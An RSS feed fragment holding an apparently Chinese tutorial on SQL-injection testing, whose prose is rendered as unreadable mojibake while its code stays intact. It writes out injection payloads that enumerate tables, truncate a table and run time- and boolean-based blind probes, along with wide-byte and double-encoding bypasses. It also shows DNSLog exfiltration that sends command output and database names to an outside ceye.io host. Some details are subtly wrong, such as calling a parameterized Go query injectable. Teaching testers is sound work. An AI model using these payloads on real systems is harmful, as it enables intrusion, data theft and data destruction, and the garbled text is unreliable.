<p><a href="https://draveness.me/golang/docs/part3-runtime/ch06-concurrency/golang-context/">https://draveness.me/golang/docs/part3-runtime/ch06-concurrency/golang-context/</a></p>
<p><a href="https://www.liwenzhou.com/posts/Go/go_context/#autoid-0-1-4">https://www.liwenzhou.com/posts/Go/go_context/#autoid-0-1-4</a></p>
]]></description>
</item><item>
    <title>å®‰å…¨æµ‹è¯•ä¹‹-SQLæ³¨å…¥</title>
    <link>https://testoai.github.io/posts/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B9%8B-sql%E6%B3%A8%E5%85%A5/</link>
    <pubDate>Thu, 29 Apr 2021 09:43:23 &#43;0800</pubDate>
    <author>ä½œè€…</author>
    <guid>https://testoai.github.io/posts/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B9%8B-sql%E6%B3%A8%E5%85%A5/</guid>
    <description><![CDATA[<h2 id="ä»€ä¹ˆæ˜¯sqlæ³¨å…¥">ä»€ä¹ˆæ˜¯<code>SQL</code>æ³¨å…¥</h2>
<p>å½“è¢«æµ‹ç¨‹åºæ²¡æœ‰å¯¹æ²¡æœ‰å¯¹è¾“å…¥å‚æ•°è¿›è¡Œæ ¡éªŒçš„æƒ…å†µä¸‹ï¼Œè¯·æ±‚æ–¹å¯ä»¥å‘å‚æ•°ä¸­æ·»åŠ ä¸€äº›å½±å“SQLçš„å­—ç¬¦ï¼Œå¯¼è‡´ç¨‹åºç›´æ¥ç”¨è¯·æ±‚è€…ä¼ å…¥çš„å‚æ•°å»æ•°æ®åº“æŸ¥è¯¢ï¼Œä¼šå¯¼è‡´åŸæœ‰çš„SQLè¢«ä¿®æ”¹ï¼Œä¸èƒ½æŒ‰é¢„æœŸæ‰§è¡Œ</p>
<h2 id="sqlæ³¨å…¥ç¤ºä¾‹"><code>SQL</code>æ³¨å…¥ç¤ºä¾‹</h2>
<p>æ¯”å¦‚ä¸€ä¸ªæŸ¥è¯¢æ¥å£ï¼ŒæŸ¥è¯¢æŒ‡å®šæ—¶é—´æ®µå†…çš„æ•°æ®</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">SELECT</span>
	<span class="o">*</span> 
<span class="k">FROM</span>
	<span class="n">STAPP</span> 
<span class="k">WHERE</span>
	<span class="n">TC_OD_OPT_DT</span> <span class="o">&gt;</span> <span class="s1">&#39;2020-11-16 15:05:01&#39;</span>
	<span class="k">AND</span> <span class="n">TC_OD_OPT_DT</span> <span class="o">&lt;</span> <span class="s1">&#39;2020-11-18 15:05:01&#39;</span>
	<span class="k">LIMIT</span> <span class="mi">0</span><span class="p">,</span><span class="mi">30</span><span class="p">;</span>
</code></pre></td></tr></table>
</div>
</div><p>å¦‚æœæ²¡æœ‰å¯¹è¾“å…¥å‚æ•°åšæ ¡éªŒï¼Œå‰ç«¯ä¼ å…¥äº†æˆªæ–­å­—ç¬¦ä¸²çš„å‚æ•°ï¼Œé‚£<code>SQL</code>å°±å˜æˆäº†ä¸‹é¢è¿™æ ·</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="k">SELECT</span>
	<span class="o">*</span> 
<span class="k">FROM</span>
	<span class="n">STAPP</span> 
<span class="k">WHERE</span>
	<span class="n">TC_OD_OPT_DT</span> <span class="o">&gt;</span> <span class="s1">&#39;2000-11-16 15:05:01&#39;</span>
	<span class="k">AND</span> <span class="n">TC_OD_OPT_DT</span> <span class="o">&lt;</span> <span class="s1">&#39;2020-11-18 15:05:01&#39;</span><span class="p">;</span><span class="c1">#&#39;) LIMIT 0,30;
</span></code></pre></td></tr></table>
</div>
</div><p>ä¸Šé¢çš„æŸ¥è¯¢ç›´æ¥æŸ¥è¯¢äº†å¾ˆé•¿ä¸€æ®µæ—¶é—´èŒƒå›´å†…çš„æ•°æ®ï¼Œå¦‚æœæ•°æ®é‡éå¸¸å¤§çš„è¯ï¼Œä¼šå¯¹æ•°æ®åº“é€ æˆè¾ƒå¤§å‹åŠ›</p>
<p>æˆ–è€…</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="k">SELECT</span>
	<span class="o">*</span> 
<span class="k">FROM</span>
	<span class="n">STAPP</span> 
<span class="k">WHERE</span>
	<span class="n">TC_OD_OPT_DT</span> <span class="o">&gt;</span> <span class="s1">&#39;2000-11-16 15:05:01&#39;</span>
	<span class="k">AND</span> <span class="n">TC_OD_OPT_DT</span> <span class="o">&lt;</span> <span class="s1">&#39;2020-11-18 15:05:01&#39;</span><span class="p">;</span>
<span class="k">select</span> <span class="n">table_name</span> <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="kp">tables</span><span class="p">;</span><span class="c1">#&#39;) LIMIT 0,30;
</span></code></pre></td></tr></table>
</div>
</div><p>ä¸Šé¢çš„æ“ä½œå°±è·å–åˆ°äº†æ‰€æœ‰è¡¨åç§°</p>
<p>å¦‚æœä¸šåŠ¡ç™»å½•çš„ç”¨æˆ·æƒé™å¤Ÿå¤§çš„è¯ï¼Œç„¶åå°±å¯ä»¥è¿™æ ·</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="k">SELECT</span>
	<span class="o">*</span> 
<span class="k">FROM</span>
	<span class="n">STAPP</span> 
<span class="k">WHERE</span>
	<span class="n">TC_OD_OPT_DT</span> <span class="o">&gt;</span> <span class="s1">&#39;2000-11-16 15:05:01&#39;</span>
	<span class="k">AND</span> <span class="n">TC_OD_OPT_DT</span> <span class="o">&lt;</span> <span class="s1">&#39;2020-11-18 15:05:01&#39;</span><span class="p">;</span>
<span class="n">truncate</span> <span class="k">table</span> <span class="n">STAPP</span><span class="p">;</span><span class="c1">#&#39;) LIMIT 0,30;
</span></code></pre></td></tr></table>
</div>
</div><p>ä¸Šé¢çš„æ“ä½œä¼šæ¸…ç©ºæ•´å¼ <code>STAPP</code>è¡¨</p>
<h2 id="æ³¨å…¥ç‚¹">æ³¨å…¥ç‚¹</h2>
<ul>
<li>
<p>æ–‡æœ¬æ¡†æ³¨å…¥</p>
<ul>
<li>å¸¸è§çš„ç”¨æˆ·åæ–‡æœ¬è¾“å…¥æ¡†ï¼Œå¯†ç æ–‡æœ¬è¾“å…¥æ¡†ï¼ŒæŸ¥è¯¢æ–‡æœ¬è¾“å…¥æ¡†</li>
</ul>
</li>
<li>
<p><code>url</code>æ³¨å…¥</p>
<ul>
<li>
<p>é’ˆå¯¹è¿æ¥åé¢çš„å‚æ•°è¿›è¡Œæµ‹è¯•ï¼Œæ¯”å¦‚åœ¨ç½‘ç«™ä¸Šç‚¹å‡»ä¸€ç¯‡æ–‡ç« ï¼Œç½‘ç«™å‰ç«¯ä¼šæŠŠæ–‡ç« çš„IDæ”¾åˆ°<code>url</code>ä¸­å‘é€<code>GET</code>è¯·æ±‚åˆ°æœåŠ¡ç«¯</p>
<p>å¦‚ï¼š<code>https://www.jianshu.com/p/178ca3ddc866</code>ï¼Œå¯ä»¥å¯¹æœ€åé¢çš„æ–‡ç« idè¿›è¡Œæ³¨å…¥æµ‹è¯•</p>
</li>
</ul>
</li>
<li>
<p>å·¥å…·</p>
<ul>
<li><code>spider</code>ï¼šå¯ä»¥è·å–åˆ°ä¸€ä¸ªç½‘å€çš„æ‰€æœ‰é“¾æ¥</li>
<li><code>sqlmap</code>ï¼šå¼€æºæ¸—é€æµ‹è¯•å·¥å…·ï¼Œèƒ½è‡ªåŠ¨æ£€æµ‹åˆ©ç”¨<code>SQL</code>æ³¨å…¥ç¼ºé™·å¹¶æ¥ç®¡æ•°æ®åº“æœåŠ¡å™¨</li>
</ul>
<p><code>sqlmap</code>ä½¿ç”¨æ–¹æ³•ï¼š</p>
<ul>
<li><code>sqlmap -u &quot;url&quot;</code>ï¼šæ£€æµ‹æ³¨å…¥ç‚¹ï¼Œ<code>url</code>ä¸­å¿…é¡»æœ‰ä¾‹å¦‚<code>id=123</code>ç±»ä¼¼çš„å‚æ•°</li>
<li><code>sqlmap -l</code>ï¼šä»<code>Burpsuite proxy</code>æˆ–<code>WebScarab proxy</code>ä¸­è¯»å–<code>http</code>è¯·æ±‚æ—¥å¿—æ–‡ä»¶</li>
<li><code>sqlmap -x</code>ï¼šä»<code>sitemap.xml</code>ç«™ç‚¹åœ°å›¾æ–‡ä»¶ä¸­è¯»å–ç›®æ ‡æ£€æµ‹</li>
<li><code>sqlmap -m</code>ï¼šä»å¤šè¡Œæ–‡æœ¬æ ¼å¼æ–‡ä»¶è¯»å–å¤šä¸ªç›®æ ‡ï¼Œå¯¹å¤šä¸ªç›®æ ‡è¿›è¡Œæ¢æµ‹</li>
<li><code>sqlmap -r</code>ï¼šä»<code>Burp suite</code>ä¿å­˜çš„æ–‡æœ¬æ–‡ä»¶ä¸­è¯»å–<code>http</code>è¯·æ±‚ä½œä¸ºæ³¨å…¥æ¢æµ‹çš„ç›®æ ‡</li>
<li><code>sqlmap -c</code>ï¼šä»é…ç½®æ–‡ä»¶<code>sqlmap.conf</code>ä¸­è¯»å–ç›®æ ‡æ¢æµ‹</li>
</ul>
</li>
</ul>
<h2 id="æ³¨å…¥æ–¹æ³•">æ³¨å…¥æ–¹æ³•</h2>
<h3 id="å¸ƒå°”ç›²æ³¨">å¸ƒå°”ç›²æ³¨</h3>
<ul>
<li>å¯ä»¥è¿›è¡Œæ³¨å…¥ï¼Œä½†æ˜¯ä¸èƒ½é€šè¿‡æ³¨å…¥ç›´æ¥æ‹¿åˆ°æ•°æ®åº“ä¸­çš„æ•°æ®</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-go" data-lang="go"><span class="kd">func</span> <span class="nf">SelectUser</span><span class="p">(</span><span class="nx">db</span> <span class="o">*</span><span class="nx">sql</span><span class="p">.</span><span class="nx">DB</span><span class="p">,</span> <span class="nx">name</span> <span class="kt">string</span><span class="p">)</span> <span class="kt">bool</span> <span class="p">{</span>
	<span class="nx">rows</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">db</span><span class="p">.</span><span class="nf">Query</span><span class="p">(</span><span class="s">`SELECT u.&#34;name&#34; FROM &#34;user&#34; u WHERE u.&#34;name&#34; = $1`</span><span class="p">,</span><span class="nx">name</span><span class="p">)</span>
	<span class="nf">ifErr</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
	<span class="nx">user</span> <span class="o">:=</span> <span class="nx">User</span><span class="p">{}</span>
    <span class="k">for</span> <span class="nx">rows</span><span class="p">.</span><span class="nf">Next</span><span class="p">()</span> <span class="p">{</span>
		<span class="nx">err</span> <span class="o">:=</span> <span class="nx">rows</span><span class="p">.</span><span class="nf">Scan</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">user</span><span class="p">.</span><span class="nx">Name</span><span class="p">)</span>
		<span class="nf">ifErr</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
        <span class="k">if</span> <span class="nx">user</span><span class="p">.</span><span class="nx">Name</span> <span class="o">==</span> <span class="s">&#34;&#34;</span><span class="p">{</span>
			<span class="k">return</span> <span class="kc">false</span>
        <span class="p">}</span><span class="k">else</span> <span class="p">{</span>
            <span class="k">return</span> <span class="kc">true</span>
        <span class="p">}</span>
	<span class="p">}</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>å¦‚æœä¸Šé¢ä»£ç ä¸­çš„<code>db.Query</code>æ–¹æ³•æ²¡æœ‰å¯¹ä¼ å…¥çš„<code>name</code>å‚æ•°åšæ ¡éªŒçš„è¯ï¼Œé‚£ä¹ˆè¯¥ç¨‹åºæ˜¯å­˜åœ¨æ³¨å…¥æ¼æ´çš„</p>
<p>è™½ç„¶æ²¡æœ‰è¿”å›æŸ¥è¯¢æ•°æ®ä¸é”™è¯¯ä¿¡æ¯ï¼Œä½†æ˜¯è¿”å›äº†æŸ¥è¯¢ç»“æœ</p>
<p>å¦‚æœæ­£å¸¸æŸ¥è¯¢æ“ä½œï¼Œä¼šè¿”å›æ­£å¸¸çš„ç»“æœ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">SelectUser(db,&#34;test&#34;)//æŸ¥è¯¢åˆ°teståˆ™è¿”å›trueï¼Œå¦åˆ™è¿”å›false
</code></pre></td></tr></table>
</div>
</div><p>å¦‚æœä¼ å…¥ä¸€ä¸ªéæ³•å‚æ•°ï¼Œå¦‚ä¸‹æ‰€ç¤º</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">SelectUser(db,&#34;test&#39;&#34;)
</code></pre></td></tr></table>
</div>
</div><p>ä¸Šé¢ä¼ å…¥çš„<code>name</code>å‚æ•°ä¸º<code>test</code>çš„å€¼å­˜åœ¨ï¼Œå½“åœ¨åé¢è¾“å…¥ä¸€ä¸ªæˆªæ–­çš„å•å¼•å·æ—¶ï¼Œè¯¥<code>sql</code>ä¼šæ‰§è¡Œå¤±è´¥ï¼Œä¼šè¿”å›<code>false</code></p>
<p>è¿™æ ·å°±æˆåŠŸçš„æµ‹è¯•å‡ºäº†è¯¥å‚æ•°æ˜¯å­˜åœ¨æ³¨å…¥æ¼æ´çš„</p>
<p>é€šè¿‡è¿™ä¸ªæ¼æ´å¯ä»¥å¯¹è¯·æ±‚å‚æ•°åæ·»åŠ ä¸€äº›å…¶ä»–çš„è¯­å¥ï¼Œå¯¹è¯·æ±‚çš„å†…å®¹åšå‡ºåˆ¤æ–­ï¼Œå¦‚æœè¿”å›<code>true</code>é‚£ä¹ˆæˆ‘ä»¬çš„åˆ¤æ–­åˆ™æ˜¯æ­£ç¡®çš„ï¼Œå¦åˆ™æ˜¯é”™è¯¯çš„</p>
<h3 id="æ—¶é—´ç›²æ³¨">æ—¶é—´ç›²æ³¨</h3>
<ul>
<li>
<p>å½“å­˜åœ¨æ³¨å…¥æ¼æ´çš„æŸ¥è¯¢æ¥å£ï¼Œæ— è®ºæœ‰æ²¡æœ‰æŸ¥è¯¢åˆ°æ•°æ®ï¼Œéƒ½è¿”å›ç›¸åŒçš„å€¼æ—¶ï¼Œå¯ä»¥æ„é€ <code>sql</code>è¯­å¥ï¼Œé€šè¿‡ç›¸åº”æ—¶é—´æ¥åˆ¤æ–­ç›²æ³¨çš„æˆåŠŸä¸å¦</p>
</li>
<li>
<p>ç¤ºä¾‹ï¼š</p>
<ul>
<li>ç¼–å†™é€»è¾‘<code>sql</code>ï¼Œé€šè¿‡æ¡ä»¶è¯­å¥è¿›è¡Œåˆ¤æ–­ï¼Œä¸ºçœŸåˆ™ç«‹å³æ‰§è¡Œï¼Œå¦åˆ™å»¶æ—¶æ‰§è¡Œã€‚è¯­æ³•ä¸ºï¼š</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="k">if</span><span class="p">(</span><span class="k">left</span><span class="p">(</span><span class="k">user</span><span class="p">(),</span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="s1">&#39;a&#39;</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">));</span>
</code></pre></td></tr></table>
</div>
</div><p>å¦‚æœ<code>left(user(),1)='a'</code>åˆ¤æ–­ä¸ºçœŸï¼Œåˆ™è¿”å›0ï¼Œå¦‚æœåˆ¤æ–­ä¸ºå‡ï¼Œåˆ™æ‰§è¡Œ<code>sleep(3)</code></p>
</li>
</ul>
<h3 id="mysqlä¸­ç›²æ³¨çš„ä¸€äº›æ–¹æ³•"><code>mysql</code>ä¸­ç›²æ³¨çš„ä¸€äº›æ–¹æ³•</h3>
<ul>
<li><code>left()</code>å‡½æ•°ï¼š</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="k">select</span> <span class="k">left</span><span class="p">(</span><span class="k">database</span><span class="p">(),</span><span class="mi">1</span><span class="p">)</span> <span class="o">=</span> <span class="s1">&#39;s&#39;</span>
</code></pre></td></tr></table>
</div>
</div><p><code>database</code>æ˜¾ç¤ºæ•°æ®åº“åç§°ï¼Œ<code>left</code>å‡½æ•°ä»å·¦æˆªå–æ•°æ®åº“åç§°çš„å‰Nä½</p>
<ul>
<li><code>regexp</code></li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="k">select</span> <span class="k">user</span><span class="p">()</span> <span class="k">regexp</span> <span class="s1">&#39;^r&#39;</span>
</code></pre></td></tr></table>
</div>
</div><p>æ­£åˆ™è¡¨è¾¾å¼çš„ç”¨æ³•ï¼Œä¸<code>left()</code>ç”¨æ³•ç›¸ä¼¼ï¼Œä¹Ÿæ˜¯ä»å·¦å¾€å³åŒ¹é…ï¼Œå½“åŒ¹é…æˆåŠŸæ—¶åˆ™è¿”å›1</p>
<ul>
<li><code>substr</code>å‡½æ•°ï¼šç”¨æ¥æˆªå–å­—ç¬¦ä¸²</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="k">SELECT</span> <span class="nf">SUBSTR</span><span class="p">((</span><span class="k">SELECT</span> <span class="k">DATABASE</span><span class="p">()),</span><span class="mi">1</span><span class="err">ï¼Œ</span><span class="mi">1</span><span class="p">)</span> <span class="o">//</span><span class="err">æˆªå–æŸ¥è¯¢ç»“æœçš„ç¬¬ä¸€ä½</span>
</code></pre></td></tr></table>
</div>
</div><ul>
<li><code>ascii</code>å‡½æ•°ï¼šå¯ä»¥å°†å­—ç¬¦ä¸²è½¬æ¢ä¸º<code>ascii</code>ç å€¼ï¼Œè¯¥æ–¹æ³•å¯ä»¥é¿å…å•å¼•å·çš„å‡ºç°ï¼Œèƒ½é€‚ç”¨äºæ›´å¤šçš„åœºæ™¯</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="k">select</span> <span class="nf">ascii</span><span class="p">(</span><span class="nf">SUBSTR</span><span class="p">((</span><span class="k">SELECT</span> <span class="k">database</span><span class="p">()),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span>
</code></pre></td></tr></table>
</div>
</div><ul>
<li>é€šè¿‡ä»¥ä¸Šæ–¹æ³•å¯ä»¥è¿›è¡Œç›²æ³¨æµ‹è¯•</li>
</ul>
<h3 id="dnslogç›²æ³¨"><code>DnsLog</code>ç›²æ³¨</h3>
<ul>
<li>å½“ç¨‹åºå­˜åœ¨æ³¨å…¥æ¼æ´ï¼Œä½†æ˜¯æ—¢ä¸ä¼šè¿”å›æŸ¥è¯¢ç»“æœï¼Œåˆä¸ä¼šè¿”å›é”™è¯¯ä¿¡æ¯æ—¶ï¼Œå¯ä»¥é€šè¿‡å¸ƒå°”ç›²æ³¨å’Œæ—¶é—´ç›²æ³¨é€šè¿‡çŒœæµ‹æ³¨å…¥çš„æ–¹å¼è·å–åˆ°æ•°æ®ï¼Œä½†æ˜¯è¿™ä¸ªè¿‡ç¨‹æ•ˆç‡å¾ˆä½ï¼Œè¦å‘èµ·å¾ˆå¤šè¯·æ±‚ã€‚</li>
<li>æ‰€ä»¥éœ€è¦ä¸€ç§æ–¹å¼ï¼Œå‡å°‘è¯·æ±‚ï¼Œç›´æ¥è¿”å›æŸ¥è¯¢ç»“æœï¼Œè¿™é‡Œå¯ä»¥ä½¿ç”¨<code>DnsLog</code>å®ç°æ³¨å…¥</li>
</ul>
<h4 id="dnslogç›²æ³¨åŸç†"><code>DnsLog</code>ç›²æ³¨åŸç†</h4>
<ul>
<li>
<p><code>DNS</code>åœ¨è§£æçš„æ—¶å€™ä¼šç•™ä¸‹æ—¥å¿—ï¼Œé€šè¿‡è¯»å–å¤šçº§åŸŸåçš„è§£ææ—¥å¿—ï¼Œè·å–è¯·æ±‚ä¿¡æ¯</p>
</li>
<li>
<p><code>DNS</code>çš„æ—¥å¿—ä¿¡æ¯</p>
<ul>
<li>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">curl xx.r4ourp.ceye.io
</code></pre></td></tr></table>
</div>
</div><table>
<thead>
<tr>
<th>è®°å½•ä¿¡æ¯</th>
<th>è¯¦æƒ…</th>
<th>åœ°å€</th>
<th>æ–¹å¼</th>
<th>user-agent</th>
</tr>
</thead>
<tbody>
<tr>
<td>HTTP Request</td>
<td><a href="http://xx.r5ourp.ceye.io/">http://xx.r5ourp.ceye.io/</a></td>
<td>10.10.10.10</td>
<td>GET</td>
<td>curl/7.3.0</td>
</tr>
<tr>
<td>DNS Query</td>
<td>xx.r5ourp.ceye.io</td>
<td>10.10.10.10</td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
</li>
<li>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">curl `whoami`.r4ourp.ceye.io
</code></pre></td></tr></table>
</div>
</div><table>
<thead>
<tr>
<th>è®°å½•ä¿¡æ¯</th>
<th>è¯¦æƒ…</th>
<th>åœ°å€</th>
<th>æ–¹å¼</th>
<th>user-agent</th>
</tr>
</thead>
<tbody>
<tr>
<td>HTTP Request</td>
<td><a href="http://test.r5ourp.ceye.io/">http://test.r5ourp.ceye.io/</a></td>
<td>10.10.10.10</td>
<td>GET</td>
<td>curl/7.3.0</td>
</tr>
<tr>
<td>DNS Query</td>
<td>test.r5ourp.ceye.io</td>
<td>10.10.10.10</td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<p>ä¸Šé¢ä½¿ç”¨åå¼•å·åŒ…èµ·æ¥çš„<code>whoami</code>è¢«æ‹¿åˆ°æœåŠ¡å™¨çš„ç»ˆç«¯å»æ‰§è¡Œäº†ï¼Œç„¶åè¿”å›çš„ç»“æœæ”¾åˆ°äº†<code>whoami</code>çš„ä½ç½®</p>
<p>ç™½è¯å°±æ˜¯ï¼Œè¢«åå¼•å·åŒ…èµ·æ¥çš„è¢«å½“åšå‘½ä»¤æ‹¿åˆ°æœåŠ¡å™¨çš„ç»ˆç«¯å»æ‰§è¡Œäº†ï¼Œè¿”å›çš„ç»“æœè¢«è®°å½•åˆ°äº†<code>DNS</code>çš„æ—¥å¿—ä¿¡æ¯é‡Œé¢</p>
</li>
</ul>
</li>
<li>
<p><code>mysql</code>çš„<code>load_file()</code></p>
<ul>
<li>åœ¨<code>mysql</code>ä¸­ï¼Œ<code>load_file</code>å‡½æ•°å¯ä»¥å‘èµ·è¯·æ±‚ï¼Œå¯ä»¥åˆ©ç”¨è¯¥å‡½æ•°å‘èµ·è¯·æ±‚ï¼Œä½¿ç”¨<code>DnsLog</code>æ¥æ”¶è¯·æ±‚ï¼Œè·å–æ•°æ®</li>
<li>è¯­æ³•ï¼š<code>SELECT LOAD_FILE(CONCAT('\\\',(SELECT DATABASE()),'.MYSQL.r4ourp.ceye.io\\abc'));</code>
<ul>
<li>é€šè¿‡SQLè¯­å¥æŸ¥è¯¢å†…å®¹ï¼Œä½œä¸ºè¯·æ±‚çš„ä¸€éƒ¨åˆ†ï¼Œå‘é€è‡³<code>DnsLog</code></li>
<li>åªè¦å¯¹è¿™éƒ¨åˆ†çš„è¯­å¥è¿›è¡Œæ„é€ ï¼Œå°±èƒ½å®ç°æœ‰å›æ˜¾çš„æ³¨å…¥</li>
<li>ä½†æ˜¯å¯¹æ•°æ®æ ¼å¼å’Œå†…å®¹æœ‰é™åˆ¶ï¼Œåªèƒ½å†™å…¥æŒ‡å®šçš„å†…å®¹</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="å®½å­—èŠ‚æ³¨å…¥">å®½å­—èŠ‚æ³¨å…¥</h3>
<h4 id="ä»€ä¹ˆæ˜¯å®½å­—èŠ‚">ä»€ä¹ˆæ˜¯å®½å­—èŠ‚</h4>
<ul>
<li>
<p>é•¿åº¦ä¸ºä¸€ä¸ªå­—èŠ‚çš„å­—ç¬¦æ˜¯çª„å­—èŠ‚ï¼Œé•¿åº¦æ˜¯ä¸¤ä¸ªå­—èŠ‚çš„å­—ç¬¦ä¸ºçª„å­—èŠ‚</p>
</li>
<li>
<p>å½“ç¨‹åºå¯¹å…¥å‚åšè¿‡ç®€å•åˆ¤æ–­æ—¶ï¼Œæ¯”å¦‚è¯´å°†å•å¼•å·è½¬ä¹‰æˆ<code>\'</code>ï¼Œè€Œå½“<code>mysql</code>åœ¨ä½¿ç”¨<code>GBK</code>ç¼–ç æ—¶ï¼Œä¼šè®¤ä¸ºä¸¤ä¸ªå­—ç¬¦ä¸ºä¸€ä¸ªæ±‰å­—</p>
<table>
<thead>
<tr>
<th>è¾“å…¥</th>
<th>å¤„ç†</th>
<th>ç¼–ç </th>
<th>è½¬ä¹‰</th>
<th>SQL</th>
</tr>
</thead>
<tbody>
<tr>
<td>%df'</td>
<td><code>%df\'</code></td>
<td>%df%5C%27</td>
<td>é‹'</td>
<td>id=é‹' and</td>
</tr>
</tbody>
</table>
<p>è¿™æ ·å°±å¯ä»¥æˆåŠŸæ³¨å…¥äº†</p>
</li>
</ul>
<h3 id="äºŒæ¬¡ç¼–ç æ³¨å…¥">äºŒæ¬¡ç¼–ç æ³¨å…¥</h3>
<ul>
<li>å½“ç»è¿‡å¤šæ¬¡ç¼–ç åçš„å‚æ•°ä»ä¸ç¬¦åˆè¦æ±‚æ˜¯ï¼Œå³å¯é€ æˆ<code>sql</code>æ³¨å…¥</li>
<li>ä¾‹å¦‚ï¼š<code>id=1%2527</code>
<ul>
<li>1.ä¸Šé¢çš„idå‚æ•°å€¼åœ¨PHPè‡ªèº«ç¼–ç ä¸­ä¼šè¢«è¯†åˆ«ä¸º<code>1%27</code></li>
<li>2.ç„¶åå¯¹<code>1%27</code>è¿›è¡Œéæ³•å­—ç¬¦çš„è½¬ä¹‰ï¼Œå› ä¸ºæ²¡æœ‰éæ³•å­—ç¬¦ï¼Œæ‰€ä»¥ç›´æ¥è·³è¿‡</li>
<li>3.æ­¤æ—¶å¦‚æœç¨‹åºä¸­ç¼–å†™çš„ä»£ç å¯¹å‚æ•°è¿›è¡Œäº†è½¬æ¢çš„è¯ï¼Œ<code>1%27</code>å°±å˜æˆäº†1'</li>
<li>æ­¤æ—¶1&rsquo;è¢«ä¼ å…¥åˆ°æ•°æ®åº“ä¸­æ˜¯å¯ä»¥å°†<code>sql</code>æˆªæ–­çš„</li>
</ul>
</li>
</ul>
<h3 id="äºŒæ¬¡æ³¨å…¥">äºŒæ¬¡æ³¨å…¥</h3>
<h4 id="åŸç†">åŸç†</h4>
<ul>
<li>1.åœ¨ä¼ å…¥çš„å‚æ•°ä¸­æ’å…¥æ¶æ„å­—ç¬¦ï¼Œæ¯”å¦‚å•å¼•å·ï¼Œç¨‹åºä¼ è¾“è¿‡ç¨‹ä¸­å¯¹å•å¼•å·è¿›è¡Œäº†è½¬ä¹‰ï¼Œä½†å…¥åº“æ—¶ä»ä¼šæŠŠåŸæœ‰æ•°æ®å…¥åº“</li>
